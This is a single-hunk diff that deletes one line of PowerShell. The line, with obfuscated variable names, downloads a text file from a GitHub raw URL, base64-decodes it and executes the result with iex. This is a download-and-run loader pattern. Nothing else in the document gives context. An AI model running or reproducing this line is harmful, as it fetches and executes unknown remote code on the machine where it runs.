@@ -1,1 +1,0 @@
-$jasbviuqsbvauosbuiasc = (iwr http://raw.githubusercontent.com/br1337/Standoff/main/text.txt -usebasicparsing).content;$ovbiubvqiuwdbwqocbqw = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($jasbviuqsbvauosbuiasc)); iex $ovbiubvqiuwdbwqocbqw
